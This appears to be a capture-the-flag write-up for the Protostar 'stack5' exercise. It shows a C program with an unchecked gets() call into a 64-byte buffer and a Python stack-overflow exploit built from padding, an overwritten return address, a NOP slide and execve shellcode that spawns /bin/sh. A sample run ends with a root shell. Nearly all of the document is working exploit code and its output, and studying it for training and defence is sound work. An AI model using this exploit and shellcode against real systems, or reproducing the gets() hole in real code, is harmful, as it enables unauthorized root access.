Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Aim: get root shell

Here is the exploit (saved as `st5.py`):
```python
import struct
eaxval=0xbffff760
ebpval=0xbffff7a8
espval=0xbffff750
padding='a'*(ebpval-eaxval)+struct.pack('<I',ebpval)
rip=struct.pack('<I',ebpval+0xc0)
nopslide='\x90'*1000

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
#shellcode = '\xcc'*4
output=padding+rip+nopslide+shellcode
print output
```

Sample output:
```bash
user@protostar:/opt/protostar/bin$ (python ~/st5.py ; cat) | ./stack5
whoami
root
```
